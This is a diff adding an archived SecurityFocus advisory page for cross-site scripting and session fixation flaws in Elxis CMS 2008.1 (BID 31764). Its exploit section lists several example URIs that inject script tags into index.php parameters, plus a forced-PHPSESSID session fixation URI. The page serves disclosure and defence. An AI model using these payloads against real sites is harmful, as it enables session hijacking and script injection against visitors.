@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid31764<p><b><span style="font-size: 18pt;">Elxis CMS 'index.php' Multiple Cross Site Scripting and Session Fixation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/31764/info">info</a><br><a href="http://www.securityfocus.com/bid/31764/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/31764/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/31764/solution">solution</a><br><a href="http://www.securityfocus.com/bid/31764/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				31764
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2008-4649<br/>
+				
+					CVE-2008-4648<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 14 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 06 2016 02:18PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				swappie aka faithlove
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Elxis Elxis CMS  2008.1<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	To exploit these issues an attacker entices an unsuspecting user into following a malicious URI.<br/><br/>The following example URIs are available for the cross-site scripting issues:<br/><br/>http://www.example.net/index.php?&amp;gt;"&amp;gt;&amp;lt;script&amp;gt;alert("XSS Vuln")&amp;lt;/script&amp;gt;<br/>http://www.example.net/index.php?option=&amp;gt;"&amp;gt;&amp;lt;script&amp;gt;alert("XSS Vuln")&amp;lt;/script&amp;gt;<br/>http://www.example.net/index.php?option=com_poll&amp;amp;Itemid=&amp;gt;"&amp;gt;&amp;lt;script&amp;gt;alert("XSS Vuln")&amp;lt;/script&amp;gt;<br/>http://www.example.net/index.php?option=com_poll&amp;amp;task=view&amp;amp;id=&amp;gt;"&amp;gt;&amp;lt;script&amp;gt;alert("XSS Vuln")&amp;lt;/script&amp;gt;<br/>http://www.example.net/index.php?option=com_poll&amp;amp;Itemid=1&amp;amp;task=&amp;gt;"&amp;gt;&amp;lt;script&amp;gt;alert("XSS Vuln")&amp;lt;/script&amp;gt;<br/>http://www.example.net/index.php?option=com_poll&amp;amp;task=view&amp;amp;bid=&amp;gt;"&amp;gt;&amp;lt;script&amp;gt;alert("XSS Vuln")&amp;lt;/script&amp;gt;<br/>http://www.example.net/index.php?option=com_poll&amp;amp;Itemid=1&amp;amp;task=view&amp;amp;contact_id=&amp;gt;"&amp;gt;&amp;lt;script&amp;gt;alert("XSS Vuln")&amp;lt;/script&amp;gt;<br/><br/>The following example URI is available for the session-fixation attack:<br/><br/>http://www.site.com/?PHPSESSID=session_fixation
+	
+		<ul>
+</ul>
+</div>
